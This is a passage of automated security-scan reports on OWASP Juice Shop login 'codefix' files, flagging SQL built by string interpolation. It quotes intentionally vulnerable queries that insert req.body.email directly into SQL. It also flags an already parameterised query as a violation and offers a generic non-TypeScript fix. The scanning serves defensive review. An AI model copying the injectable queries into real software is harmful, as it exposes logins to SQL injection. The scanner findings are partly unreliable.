# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginJimChallenge_1_correct.ts`
**Scanned at**: 2026-10-11T16:35:12.737420+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginBenderChallenge_4.ts`
**Scanned at**: 2026-10-11T16:35:13.688040+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: f...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/static/codefixes/loginBenderChallenge_3.ts`
**Scanned at**: 2026-10-11T16:35:13.969938+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, 